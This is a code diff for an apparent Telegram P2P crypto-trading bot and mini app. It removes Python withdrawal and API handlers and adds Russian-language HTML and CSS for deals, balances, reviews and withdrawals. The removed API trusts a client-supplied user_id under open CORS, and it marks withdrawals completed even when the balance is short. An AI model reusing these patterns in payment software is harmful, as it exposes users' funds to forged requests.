-    lang = get_user_language(message.from_user.id)
-    if not is_admin(message.from_user.id):
-        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
-        return
-    args = message.text.split()
-    if len(args) != 2:
-        await message.answer(f"❗️ {get_text(lang, 'cmd_usage')}: /confirm_withdraw [ID]")
-        return
-    request_id = args[1]
-    if request_id not in withdraw_requests:
-        await message.answer(f"❌ {get_text(lang, 'request_not_found')}")
-        return
-    req = withdraw_requests[request_id]
-    if req.get("status") != "pending":
-        await message.answer(f"❌ {get_text(lang, 'request_already_processed')}")
-        return
-    bal = get_balance(req["user_id"])
-    curr_key = req["currency"].lower()
-    if bal.get(curr_key, 0) >= req["amount"]:
-        bal[curr_key] -= req["amount"]
-        save_json(FILES["balance"], balance)
-    req["status"] = "completed"
-    req["completed_at"] = datetime.now().isoformat()
-    save_json(FILES["withdraw"], withdraw_requests)
-    
-    add_log("withdraw_confirmed", {
-        "admin": message.from_user.username,
-        "request_id": request_id,
-        "user_id": req["user_id"],
-        "username": req.get("username", "?"),
-        "amount": req["amount"],
-        "currency": req["currency"]
-    })
-    
-    await message.answer(f"✅ {get_text(lang, 'withdraw_completed')} #{request_id}")
-    try:
-        await bot.send_message(
-            req["user_id"],
-            f"✅ <b>{get_text(lang, 'withdraw_completed')}</b>\n\n"
-            f"💰 {req['amount']} {req['currency']}"
-        )
-    except:
-        pass
-
-@dp.message(Command("reject_withdraw"))
-async def reject_withdraw_command(message: types.Message):
-    lang = get_user_language(message.from_user.id)
-    if not is_admin(message.from_user.id):
-        await message.answer(f"⛔ {get_text(lang, 'access_denied')}")
-        return
-    args = message.text.split()
-    if len(args) != 2:
-        await message.answer(f"❗️ {get_text(lang, 'cmd_usage')}: /reject_withdraw [ID]")
-        return
-    request_id = args[1]
-    if request_id not in withdraw_requests:
-        await message.answer(f"❌ {get_text(lang, 'request_not_found')}")
-        return
-    req = withdraw_requests[request_id]
-    if req.get("status") != "pending":
-        await message.answer(f"❌ {get_text(lang, 'request_already_processed')}")
-        return
-    req["status"] = "rejected"
-    save_json(FILES["withdraw"], withdraw_requests)
-    
-    add_log("withdraw_rejected", {
-        "admin": message.from_user.username,
-        "request_id": request_id,
-        "user_id": req["user_id"]
-    })
-    
-    await message.answer(f"❌ Заявка #{request_id} отклонена")
-
-# ============================================================
-# 21. API ДЛЯ MINI APP
-# ============================================================
-async def handle_api(request):
-    headers = {
-        'Access-Control-Allow-Origin': '*',
-        'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
-        'Access-Control-Allow-Headers': 'Content-Type, X-Telegram-User-Id, X-Telegram-Username'
-    }
-    if request.method == 'OPTIONS':
-        return web.Response(headers=headers)
-    
-    if request.method == 'GET':
-        return web.json_response({
-            'success': True,
-            'bot': BOT_NAME,
-            'version': '1.0.0',
-            'status': 'running'
-        }, headers=headers)
-    
-    try:
-        data = await request.json()
-    except:
-        data = {}
-    
-    user_id = data.get('user_id')
-    username = data.get('username', str(user_id))
-    endpoint = request.path
-    
-    # ===== БАЛАНС =====
-    if endpoint == '/api/balance':
-        if not user_id:
-            return web.json_response({'success': False, 'error': 'user_id required'}, headers=headers)
-        bal = get_balance(user_id)
-        return web.json_response({'success': True, 'balance': bal}, headers=headers)
-    
-    # ===== СОЗДАНИЕ СДЕЛКИ =====
-    elif endpoint == '/api/create_deal':
-        product = data.get('product')
-        currency = data.get('currency')
-        amount = data.get('amount')
-        buyer_username = data.get('buyer_username')
-        payment_method = data.get('payment_method', 'balance')
-        
-        if not all([user_id, product, currency, amount, buyer_username]):
-            return web.json_response({'success': False, 'error': 'Missing fields'}, headers=headers)
-        
-        deal_id = str(uuid.uuid4())[:8]
-        deals[deal_id] = {
-            "deal_id": deal_id,
-            "seller_id": user_id,
-            "seller_username": username,
-            "buyer_username": buyer_username.lower(),
-            "buyer_id": None,
-            "product": product,
-            "currency": currency,
-            "amount": float(amount),
-            "status": "waiting_payment",
-            "payment_method": payment_method,
-            "created_at": datetime.now().isoformat(),
-            "paid_by_admin": None,
-            "completed_at": None
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 14px 20px;
+            background: var(--bg-card);
+            backdrop-filter: blur(24px);
+            border-radius: var(--radius);
+            border: 1px solid var(--border-color);
+            box-shadow: 0 8px 40px rgba(0,152,234,0.08);
+            margin-bottom: 16px;
+            flex-wrap: wrap;
+            gap: 8px;
         }
-        save_json(FILES["deals"], deals)
-        link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
-        
-        add_log("api_create_deal", {
-            "user_id": user_id,
-            "username": username,
-            "deal_id": deal_id,
-            "product": product,
-            "amount": amount,
-            "currency": currency,
-            "buyer_username": buyer_username
-        })
-        
-        if payment_method == 'balance':
-            buyer_balance = get_balance(user_id)
-            curr_key = currency.lower()
-            if buyer_balance.get(curr_key, 0) >= amount:
-                buyer_balance[curr_key] -= amount
-                save_json(FILES["balance"], balance)
-                deals[deal_id]["status"] = "paid"
-                deals[deal_id]["paid_by_admin"] = user_id
-                save_json(FILES["deals"], deals)
+        .header-left { display: flex; align-items: center; gap: 12px; }
+        .header-logo { font-size: 32px; }
+        .header-title { font-size: 20px; font-weight: 900; background: linear-gradient(135deg, #ffffff, var(--ton-blue), var(--gold)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .header-title span { font-weight: 400; -webkit-text-fill-color: var(--text-secondary); }
+        .header-right { display: flex; flex-direction: column; align-items: flex-end; gap: 2px; }
+        .header-user { font-size: 12px; color: var(--text-secondary); font-weight: 500; }
+        .header-balance { font-size: 15px; font-weight: 700; color: var(--gold); background: rgba(240,185,11,0.06); padding: 2px 14px; border-radius: 20px; }
+        .online-badge { display: inline-flex; align-items: center; gap: 6px; background: rgba(46,204,113,0.08); padding: 4px 14px; border-radius: 30px; font-size: 11px; font-weight: 600; color: #2ecc71; border: 1px solid rgba(46,204,113,0.1); }
+        .online-dot { width: 7px; height: 7px; background: #2ecc71; border-radius: 50%; display: inline-block; animation: pulse-ring 1.8s ease-in-out infinite; }
+
+        .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 16px; }
+        .stat-card { background: var(--bg-card); backdrop-filter: blur(16px); border-radius: var(--radius-sm); padding: 14px 10px; border: 1px solid var(--border-color); text-align: center; transition: all 0.4s; }
+        .stat-card:hover { border-color: rgba(0,152,234,0.2); transform: translateY(-3px); }
+        .stat-number { font-size: 22px; font-weight: 900; background: linear-gradient(135deg, var(--ton-blue), var(--gold)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; display: block; }
+        .stat-label { font-size: 9px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.8px; font-weight: 600; margin-top: 4px; }
+
+        .nav {
+            display: flex;
+            gap: 4px;
+            background: var(--bg-card);
+            backdrop-filter: blur(20px);
+            padding: 6px;
+            border-radius: var(--radius);
+            border: 1px solid var(--border-color);
+            margin-bottom: 16px;
+            overflow-x: auto;
+            flex-wrap: nowrap;
+        }
+        .nav button {
+            flex: 1;
+            min-width: 52px;
+            padding: 10px 6px;
+            border: none;
+            border-radius: var(--radius-sm);
+            background: transparent;
+            color: var(--text-secondary);
+            font-size: 10px;
+            font-weight: 600;
+            font-family: 'Inter', sans-serif;
+            cursor: pointer;
+            transition: all 0.35s;
+            white-space: nowrap;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 2px;
+        }
+        .nav button i { font-size: 18px; }
+        .nav button span { font-size: 8px; opacity: 0.7; font-weight: 500; }
+        .nav button .badge-count { background: var(--ton-gradient); color: #fff; border-radius: 30px; padding: 0 7px; font-size: 8px; font-weight: 700; margin-left: 2px; }
+        .nav button.active { background: var(--ton-gradient); color: #fff; box-shadow: 0 8px 30px rgba(0,152,234,0.25); }
+        .nav button.active i { color: #fff; }
+        .nav button:hover:not(.active) { color: var(--text-primary); background: rgba(0,152,234,0.06); }
+
+        .page { display: none; animation: slideUp 0.5s ease; }
+        .page.active { display: block; }
+
+        .card { background: var(--bg-card); backdrop-filter: blur(20px); border-radius: var(--radius); padding: 20px; margin: 10px 0; border: 1px solid var(--border-color); box-shadow: 0 8px 40px rgba(0,152,234,0.08); transition: all 0.4s; }
+        .card:hover { border-color: rgba(0,152,234,0.12); }
+        .card-glow { border-color: rgba(0,152,234,0.15); }
+        .card-title { font-size: 17px; font-weight: 800; margin-bottom: 12px; display: flex; align-items: center; gap: 10px; letter-spacing: -0.3px; }
+        .card-title i { color: var(--ton-blue); font-size: 18px; }
+        .card-subtitle { font-size: 13px; color: var(--text-secondary); font-weight: 400; margin-bottom: 14px; }
+
+        .btn {
+            padding: 12px 20px;
+            border: none;
+            border-radius: var(--radius-sm);
+            font-weight: 700;
+            font-size: 14px;
+            font-family: 'Inter', sans-serif;
+            cursor: pointer;
+            transition: all 0.35s;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            width: 100%;
+        }
+        .btn-primary { background: var(--ton-gradient); color: #fff; box-shadow: 0 8px 30px rgba(0,152,234,0.2); }
+        .btn-primary:hover { transform: translateY(-3px); box-shadow: 0 12px 40px rgba(0,152,234,0.3); }
+        .btn-secondary { background: rgba(255,255,255,0.04); color: var(--text-primary); border: 1px solid var(--border-color); }
+        .btn-secondary:hover { background: rgba(255,255,255,0.08); transform: translateY(-2px); }
+        .btn-gold { background: linear-gradient(135deg, var(--gold), #d4a00a); color: #0a0e1a; box-shadow: 0 8px 30px rgba(240,185,11,0.15); }
+        .btn-gold:hover { transform: translateY(-3px); box-shadow: 0 12px 40px rgba(240,185,11,0.25); }
+        .btn-success { background: rgba(46,204,113,0.12); color: #2ecc71; border: 1px solid rgba(46,204,113,0.15); }
+        .btn-success:hover { background: rgba(46,204,113,0.2); transform: translateY(-2px); }
+        .btn-danger { background: rgba(231,76,60,0.12); color: #e74c3c; border: 1px solid rgba(231,76,60,0.15); }
+        .btn-danger:hover { background: rgba(231,76,60,0.2); transform: translateY(-2px); }
+        .btn-sm { padding: 8px 16px; font-size: 12px; width: auto; }
+        .btn:disabled { opacity: 0.4; cursor: not-allowed; transform: none !important; }
+        .btn-group { display: flex; gap: 8px; flex-wrap: wrap; }
+        .btn-group .btn { flex: 1; min-width: 60px; }
+
+        .form-group { margin: 12px 0; }
+        .form-group label { display: block; color: var(--text-secondary); font-size: 12px; font-weight: 600; margin-bottom: 5px; }
+        .form-group input, .form-group select, .form-group textarea {
+            width: 100%;
+            padding: 12px 16px;
+            background: rgba(0,0,0,0.3);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-sm);
+            color: var(--text-primary);
+            font-size: 14px;
+            font-family: 'Inter', sans-serif;
+            transition: all 0.3s;
+            box-sizing: border-box;
+        }
+        .form-group input:focus, .form-group select:focus, .form-group textarea:focus {
+            outline: none;
+            border-color: var(--ton-blue);
+            box-shadow: 0 0 0 4px rgba(0,152,234,0.06);
+        }
+        .form-group textarea { resize: vertical; min-height: 70px; }
+
+        .balance-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; }
+        .balance-item { display: flex; flex-direction: column; align-items: center; padding: 12px 8px; background: rgba(0,0,0,0.2); border-radius: var(--radius-sm); border: 1px solid var(--border-color); transition: all 0.3s; }
+        .balance-item:hover { border-color: rgba(0,152,234,0.2); }
+        .balance-item .label { font-size: 10px; color: var(--text-muted); font-weight: 500; }
+        .balance-item .value { font-size: 18px; font-weight: 800; margin-top: 2px; }
+        .balance-item .value.ton { color: var(--ton-blue); }
+        .balance-item .value.stars { color: var(--gold); }
+        .balance-item .value.rub { color: #4ecdc4; }
+        .balance-item .value.uah { color: #ff6b6b; }
+
+        .review-card { background: rgba(0,0,0,0.2); border-radius: var(--radius-sm); padding: 14px; margin: 6px 0; border: 1px solid var(--border-color); transition: all 0.3s; }
+        .review-card:hover { border-color: rgba(0,152,234,0.1); }
+        .review-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px; }
+        .review-user { display: flex; align-items: center; gap: 10px; }
+        .review-avatar { width: 34px; height: 34px; border-radius: 50%; background: var(--ton-gradient); display: flex; align-items: center; justify-content: center; font-weight: 700; color: #fff; font-size: 13px; flex-shrink: 0; }
+        .review-name.anonymous { color: var(--text-secondary); font-size: 13px; font-weight: 500; }
+        .review-date { font-size: 10px; color: var(--text-muted); }
+        .review-text { font-size: 13px; line-height: 1.6; color: var(--text-secondary); margin-top: 6px; }
+        .review-stars { color: var(--gold); font-size: 13px; margin-top: 2px; }
+
+        .deal-card { background: rgba(0,0,0,0.2); border-radius: var(--radius-sm); padding: 14px; margin: 6px 0; border: 1px solid var(--border-color); transition: all 0.3s; }
+        .deal-card:hover { border-color: rgba(0,152,234,0.1); }
+        .deal-status { display: inline-block; padding: 2px 14px; border-radius: 30px; font-size: 10px; font-weight: 700; }
+        .deal-status.waiting { background: rgba(243,156,18,0.12); color: #f39c12; }
+        .deal-status.paid { background: rgba(46,204,113,0.12); color: #2ecc71; }
+        .deal-status.awaiting { background: rgba(52,152,219,0.12); color: #3498db; }
+        .deal-status.completed { background: rgba(155,89,182,0.12); color: #9b59b6; }
+
+        .modal {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(20px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            padding: 16px;
+        }
+        .modal.active { display: flex; }
+        .modal-content { background: var(--bg-secondary); border-radius: var(--radius); padding: 24px; max-width: 460px; width: 100%; max-height: 85vh; overflow-y: auto; border: 1px solid var(--border-color); box-shadow: 0 24px 80px rgba(0,0,0,0.5); animation: slideUp 0.4s ease; }
+        .modal-close { float: right; font-size: 24px; cursor: pointer; color: var(--text-muted); background: none; border: none; transition: 0.3s; padding: 4px; }
+        .modal-close:hover { color: var(--text-primary); transform: rotate(90deg); }
+
+        .toast {
+            position: fixed;
+            bottom: 24px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: var(--bg-secondary);
+            color: var(--text-primary);
+            padding: 14px 24px;
+            border-radius: var(--radius-sm);
+            border: 1px solid var(--border-color);
+            box-shadow: 0 16px 60px rgba(0,0,0,0.4);
+            z-index: 2000;
+            animation: slideUp 0.4s ease;
+            max-width: 92%;
+            text-align: center;
+            font-weight: 500;
+            font-size: 14px;
+            backdrop-filter: blur(20px);
+        }
+        .toast.success { border-color: rgba(46,204,113,0.3); }
+        .toast.error { border-color: rgba(231,76,60,0.3); }
+        .toast.info { border-color: rgba(0,152,234,0.3); }
+
+        .support-block { background: rgba(0,152,234,0.04); border-radius: var(--radius-sm); padding: 14px; border-left: 3px solid var(--ton-blue); margin-top: 8px; }
+        .support-block a { color: var(--ton-blue); text-decoration: none; font-weight: 600; }
+
+        .loading { text-align: center; padding: 30px; color: var(--text-muted); }
+        .loading i { font-size: 28px; color: var(--ton-blue); animation: spin-slow 1.2s linear infinite; display: block; margin-bottom: 12px; }
+
+        .text-gold { color: var(--gold); }
+        .text-ton { color: var(--ton-blue); }
+        .text-muted { color: var(--text-muted); }
+        .text-secondary { color: var(--text-secondary); }
+        .text-center { text-align: center; }
+        .text-success { color: #2ecc71; }
+        .text-danger { color: #e74c3c; }
+        .mt-6 { margin-top: 6px; }
+        .mt-10 { margin-top: 10px; }
+        .mt-16 { margin-top: 16px; }
+        .mb-10 { margin-bottom: 10px; }
+        .flex { display: flex; gap: 8px; }
+        .flex .btn { flex: 1; }
+        .gap-6 { gap: 6px; }
+        .badge-count { background: var(--ton-gradient); color: #fff; border-radius: 30px; padding: 0 7px; font-size: 8px; font-weight: 700; margin-left: 2px; }
+
+        .verification-status {
+            padding: 10px 14px;
+            border-radius: var(--radius-sm);
+            margin: 8px 0;
+            font-size: 13px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .verification-status.verified { background: rgba(46,204,113,0.1); border: 1px solid rgba(46,204,113,0.2); color: #2ecc71; }
+        .verification-status.unverified { background: rgba(243,156,18,0.1); border: 1px solid rgba(243,156,18,0.2); color: #f39c12; }
+        .verification-status.expired { background: rgba(231,76,60,0.1); border: 1px solid rgba(231,76,60,0.2); color: #e74c3c; }
+        .verification-status .btn { width: auto; padding: 6px 14px; font-size: 12px; }
+
+        @media (max-width: 480px) {
+            body { padding: 10px; }
+            .header { padding: 12px 14px; }
+            .header-title { font-size: 16px; }
+            .header-logo { font-size: 26px; }
+            .stats-grid { grid-template-columns: repeat(2, 1fr); gap: 6px; }
+            .stat-number { font-size: 18px; }
+            .balance-grid { grid-template-columns: repeat(2, 1fr); }
+            .nav button { min-width: 42px; padding: 8px 4px; }
+            .nav button i { font-size: 15px; }
+            .nav button span { font-size: 7px; }
+            .card { padding: 14px; }
+            .btn { padding: 10px 14px; font-size: 12px; }
+            .language-grid { grid-template-columns: 1fr 1fr; }
+            .language-overlay h1 { font-size: 24px; }
+            .language-overlay .logo-icon { font-size: 48px; }
+        }
+        @media (min-width: 768px) {
+            body { padding: 24px; max-width: 860px; margin: 0 auto; }
+            .stats-grid { grid-template-columns: repeat(4, 1fr); }
+            .balance-grid { grid-template-columns: repeat(4, 1fr); }
+            .nav button { font-size: 12px; padding: 12px 8px; }
+            .nav button span { font-size: 10px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== ВЫБОР ЯЗЫКА ===== -->
+    <div class="language-overlay active" id="languageOverlay">
+        <div class="logo-icon">🔥</div>
+        <h1>P2P Exchange</h1>
+        <p id="langPrompt">Выберите язык / Choose your language</p>
+        <div class="language-grid">
+            <button class="lang-btn" onclick="setLanguage('ru')">🇷🇺 Русский</button>
+            <button class="lang-btn" onclick="setLanguage('en')">🇬🇧 English</button>
+            <button class="lang-btn" onclick="setLanguage('zh')">🇨🇳 中文</button>
+            <button class="lang-btn" onclick="setLanguage('ar')">🇸🇦 العربية</button>
+        </div>
+    </div>
+
+    <!-- ===== ХЕДЕР ===== -->
+    <header class="header">
+        <div class="header-left">
+            <span class="header-logo">🔥</span>
+            <span class="header-title" id="headerTitle">P2P <span id="headerTitleSpan">Exchange</span></span>
+        </div>
+        <div class="header-right">
+            <span class="header-user" id="userName">👤 Загрузка...</span>
+            <span class="header-balance" id="userBalance"><i class="fas fa-coins"></i> 0</span>
+            <span class="online-badge">
+                <span class="online-dot"></span>
+                <span id="onlineCount">0</span> <span id="onlineLabel">онлайн</span>
+            </span>
+        </div>
+    </header>
+
+    <!-- ===== СТАТИСТИКА ===== -->
+    <div class="stats-grid">
+        <div class="stat-card">
+            <span class="stat-number" id="statDealsToday">0</span>
+            <span class="stat-label" id="statLabel1"><i class="fas fa-exchange-alt stat-icon"></i> Сделок сегодня</span>
+        </div>
+        <div class="stat-card">
+            <span class="stat-number" id="statUsers">0</span>
+            <span class="stat-label" id="statLabel2"><i class="fas fa-users stat-icon"></i> Пользователей</span>
+        </div>
+        <div class="stat-card">
+            <span class="stat-number" id="statReviews">0</span>
+            <span class="stat-label" id="statLabel3"><i class="fas fa-star stat-icon"></i> Отзывов</span>
+        </div>
+        <div class="stat-card">
+            <span class="stat-number" id="statVolume">0</span>
+            <span class="stat-label" id="statLabel4"><i class="fas fa-chart-line stat-icon"></i> Объём (TON)</span>
+        </div>
+    </div>
+
+    <!-- ===== НАВИГАЦИЯ ===== -->
+    <nav class="nav">
+        <button class="active" data-page="main"><i class="fas fa-home"></i><span id="navMain">Главная</span></button>
+        <button data-page="create"><i class="fas fa-plus-circle"></i><span id="navCreate">Сделка</span></button>
+        <button data-page="deals"><i class="fas fa-list"></i><span id="navDeals">Сделки</span></button>
+        <button data-page="reviews"><i class="fas fa-star"></i><span id="navReviews">Отзывы <span class="badge-count" id="reviewBadge">0</span></span></button>
+        <button data-page="balance"><i class="fas fa-wallet"></i><span id="navBalance">Баланс</span></button>
+        <button data-page="admin"><i class="fas fa-crown"></i><span id="navAdmin">Админ</span></button>
+    </nav>
+
+    <!-- ===== КОНТЕНТ ===== -->
+    <div id="content">
+
+        <!-- ===== ГЛАВНАЯ ===== -->
+        <div class="page active" id="page-main">
+            <div class="card card-glow">
+                <div class="card-title"><i class="fas fa-rocket text-ton"></i> <span id="welcomeTitle">Добро пожаловать!</span></div>
+                <p id="welcomeText" style="color: var(--text-secondary); line-height: 1.6;">Безопасные P2P сделки с криптовалютой. <span class="text-gold">P2P Exchange</span> — ваш надёжный партнёр.</p>
+            </div>
+
+            <div class="card" style="background: linear-gradient(135deg, rgba(0,136,204,0.05), rgba(240,185,11,0.02)); border-color: rgba(0,136,204,0.15);">
+                <div class="card-title" style="font-size: 14px;"><i class="fas fa-bolt text-ton"></i> <span id="quickStart">Быстрый старт</span></div>
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 6px;">
+                    <button class="btn btn-primary" onclick="showPage('create')"><i class="fas fa-plus-circle"></i> <span id="btnCreateDeal">Создать сделку</span></button>
+                    <button class="btn btn-secondary" onclick="showPage('reviews')"><i class="fas fa-star"></i> <span id="btnReviews">Отзывы</span></button>
+                    <button class="btn btn-secondary" onclick="showPage('balance')"><i class="fas fa-wallet"></i> <span id="btnBalance">Баланс</span></button>
+                    <button class="btn btn-secondary" onclick="showPage('deals')"><i class="fas fa-list"></i> <span id="btnDeals">Мои сделки</span></button>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-title"><i class="fas fa-shield-alt text-ton"></i> <span id="howWorks">Как это работает</span></div>
+                <div style="display: grid; gap: 4px; font-size: 13px; color: var(--text-secondary);">
+                    <div id="step1">1️⃣ <span style="color: var(--text-primary);">Создайте сделку</span> — опишите товар и сумму</div>
+                    <div id="step2">2️⃣ <span style="color: var(--text-primary);">Отправьте ссылку</span> покупателю</div>
+                    <div id="step3">3️⃣ <span style="color: var(--text-primary);">Покупатель оплачивает</span> на сайте</div>
+                    <div id="step4">4️⃣ <span style="color: var(--text-primary);">Продавец передаёт товар</span> — нажимает кнопку</div>
+                    <div id="step5">5️⃣ <span style="color: var(--text-primary);">Покупатель подтверждает</span> получение</div>
+                    <div id="step6">6️⃣ <span style="color: var(--text-primary);">Деньги зачисляются</span> продавцу</div>
+                </div>
+                <div class="support-block">
+                    <span id="securityText" style="font-size: 12px; color: var(--text-secondary);">🔒 Защита от мошенников • Верификация • 24/7 поддержка</span>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="card-title"><i class="fas fa-comment-dots text-ton"></i> <span id="recentReviewsTitle">Последние отзывы</span></div>
+                <div id="recentReviews"><div class="loading"><i class="fas fa-spinner"></i> <span id="loadingText">Загрузка...</span></div></div>
+            </div>
+
+            <div class="support-block">
+                <p style="font-size: 13px; color: var(--text-secondary);">
+                    <i class="fas fa-headset"></i> <span id="supportLabel">Поддержка</span>:
+                    <a href="https://t.me/p2psupbot" target="_blank">@p2psupbot</a> &nbsp;|&nbsp;
+                    <i class="fas fa-bullhorn"></i> <span id="channelLabel">Канал</span>:
+                    <a href="https://t.me/tonkeeper_news" target="_blank">tonkeeper_news</a>
+                </p>
+            </div>
+        </div>
+
+        <!-- ===== СОЗДАНИЕ СДЕЛКИ ===== -->
+        <div class="page" id="page-create">
+            <div class="card">
+                <div class="card-title"><i class="fas fa-plus-circle text-ton"></i> <span id="createTitle">Создать сделку</span></div>
+                <div class="card-subtitle" id="createSubtitle">Заполните форму</div>
+
+                <form id="dealForm">
+                    <div class="form-group">
+                        <label><i class="fas fa-tag"></i> <span id="labelProduct">Товар или услуга</span></label>
+                        <input type="text" id="productInput" placeholder="NFT-подарок Telegram Premium" required>
+                    </div>
+                    <div class="form-group">
+                        <label><i class="fas fa-coins"></i> <span id="labelCurrency">Валюта</span></label>
+                        <select id="currencySelect">
+                            <option value="TON">💎 TON</option>
+                            <option value="STARS">⭐️ STARS</option>
+                            <option value="RUB">💰 RUB</option>
+                            <option value="UAH">🌐 UAH</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label><i class="fas fa-dollar-sign"></i> <span id="labelAmount">Сумма</span></label>
+                        <input type="number" id="amountInput" placeholder="100" required>
+                    </div>
+                    <div class="form-group">
+                        <label><i class="fas fa-user"></i> <span id="labelBuyer">Username покупателя (без @)</span></label>
+                        <input type="text" id="buyerInput" placeholder="john_doe" required>
+                    </div>
+                    <button type="submit" class="btn btn-primary"><i class="fas fa-check-circle"></i> <span id="btnCreate">Создать сделку</span></button>
+                </form>
+                <div id="dealResult" style="display:none;" class="card mt-10"></div>
+                <button class="btn btn-secondary mt-10" onclick="showPage('main')"><i class="fas fa-arrow-left"></i> <span id="btnBackMain">На главную</span></button>
+            </div>
+        </div>
+
+        <!-- ===== МОИ СДЕЛКИ ===== -->
+        <div class="page" id="page-deals">
+            <div class="card">
+                <div class="card-title"><i class="fas fa-list text-ton"></i> <span id="myDealsTitle">Мои сделки</span></div>
+                <div id="dealsList"><div class="loading"><i class="fas fa-spinner"></i> <span id="loadingDeals">Загрузка...</span></div></div>
+                <button class="btn btn-secondary mt-10" onclick="showPage('main')"><i class="fas fa-arrow-left"></i> <span id="btnBackMain2">На главную</span></button>
+            </div>
+        </div>
+
+        <!-- ===== ОТЗЫВЫ ===== -->
+        <div class="page" id="page-reviews">
+            <div class="card">
+                <div class="card-title"><i class="fas fa-star text-ton"></i> <span id="reviewsTitle">Отзывы</span> <span id="reviewTotal" style="font-size:12px; color:var(--text-secondary);"></span></div>
+                <div class="card-subtitle" id="reviewsSubtitle">Оставляйте отзывы после сделок</div>
+
+                <div id="reviewFormContainer" style="background: rgba(0,136,204,0.04); border-radius:12px; padding:12px; margin-bottom:12px; border: 1px solid rgba(0,136,204,0.08);">
+                    <div class="form-group">
+                        <label><i class="fas fa-star"></i> <span id="labelRating">Оценка</span></label>
+                        <select id="reviewRating">
+                            <option value="5">⭐⭐⭐⭐⭐ 5</option>
+                            <option value="4">⭐⭐⭐⭐ 4</option>
+                            <option value="3">⭐⭐⭐ 3</option>
+                            <option value="2">⭐⭐ 2</option>
+                            <option value="1">⭐ 1</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label><i class="fas fa-comment"></i> <span id="labelReviewText">Отзыв</span></label>
+                        <textarea id="reviewText" placeholder="Напишите ваш отзыв анонимно..." rows="2"></textarea>
+                    </div>
+                    <button class="btn btn-gold" onclick="submitReview()"><i class="fas fa-paper-plane"></i> <span id="btnSubmitReview">Отправить отзыв</span></button>
+                    <div id="reviewStatus" style="margin-top:6px; font-size:12px;"></div>
+                </div>
+
+                <div id="reviewsList"><div class="loading"><i class="fas fa-spinner"></i> <span id="loadingReviews">Загрузка...</span></div></div>
+                <button class="btn btn-secondary mt-10" onclick="loadMoreReviews()"><i class="fas fa-chevron-down"></i> <span id="btnLoadMore">Загрузить ещё</span></button>
+            </div>
+        </div>
+
+        <!-- ===== БАЛАНС ===== -->
+        <div class="page" id="page-balance">
+            <div class="card">
+                <div class="card-title"><i class="fas fa-wallet text-ton"></i> <span id="balanceTitle">Мой баланс</span></div>
+                <div class="balance-grid" id="balanceDisplay">
+                    <div class="balance-item"><span class="label">💎 TON</span> <span class="value ton" id="balTon">0</span></div>
+                    <div class="balance-item"><span class="label">⭐️ STARS</span> <span class="value stars" id="balStars">0</span></div>
+                    <div class="balance-item"><span class="label">💰 RUB</span> <span class="value rub" id="balRub">0</span></div>
+                    <div class="balance-item"><span class="label">🌐 UAH</span> <span class="value uah" id="balUah">0</span></div>
+                </div>
+                <button class="btn btn-primary mt-10" onclick="toggleWithdraw()"><i class="fas fa-arrow-up"></i> <span id="btnWithdraw">Вывести средства</span></button>
+                <div id="withdrawSection" style="display:none;" class="mt-10">
+                    <div id="withdrawStatus" class="verification-status" style="display:none;"></div>
+                    <div class="support-block" style="margin-bottom:8px;">
+                        <span style="font-size:12px; color:var(--text-secondary);" id="withdrawInfo">💳 Вывод средств</span>
+                    </div>
+                    <div class="form-group">
+                        <label><span id="labelWithdrawCurrency">Валюта</span></label>
+                        <select id="withdrawCurrency">
+                            <option value="TON">💎 TON</option>
+                            <option value="STARS">⭐️ STARS</option>
+                            <option value="RUB">💰 RUB</option>
+                            <option value="UAH">🌐 UAH</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label><span id="labelWithdrawDetails">Реквизиты</span></label>
+                        <input type="text" id="withdrawDetails" placeholder="Кошелёк или номер карты">
+                    </div>
+                    <button class="btn btn-primary" onclick="confirmWithdraw()"><i class="fas fa-check"></i> <span id="btnConfirmWithdraw">Подтвердить вывод</span></button>
+                </div>
+                <button class="btn btn-secondary mt-10" onclick="showPage('main')"><i class="fas fa-arrow-left"></i> <span id="btnBackMain3">На главную</span></button>
+            </div>
+        </div>
+
+        <!-- ===== АДМИН ===== -->
+        <div class="page" id="page-admin">
+            <div class="card">
+                <div class="card-title"><i class="fas fa-crown text-ton"></i> <span id="adminTitle">Админ панель</span></div>
+                <div id="adminContent"><div class="loading"><i class="fas fa-spinner"></i> <span id="loadingAdmin">Проверка прав...</span></div></div>
+                <button class="btn btn-secondary mt-10" onclick="showPage('main')"><i class="fas fa-arrow-left"></i> <span id="btnBackMain4">На главную</span></button>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- ===== МОДАЛКА ===== -->
+    <div class="modal" id="modal">
+        <div class="modal-content">
+            <button class="modal-close" onclick="closeModal()">&times;</button>
+            <div id="modalBody"></div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- СКРИПТЫ -->
+    <!-- ============================================================ -->
+    <script>
+        // ============================================================
+        // 1. КОНФИГУРАЦИЯ
+        // ============================================================
+        const API_BASE = 'https://otc-bot-hwua.onrender.com';
+        const BOT_USERNAME = 'tonkeeperp2p_bot';
+
+        // ============================================================
+        // 2. TELEGRAM
+        // ============================================================
+        const tg = window.Telegram.WebApp;
+        if (tg) tg.expand();
+
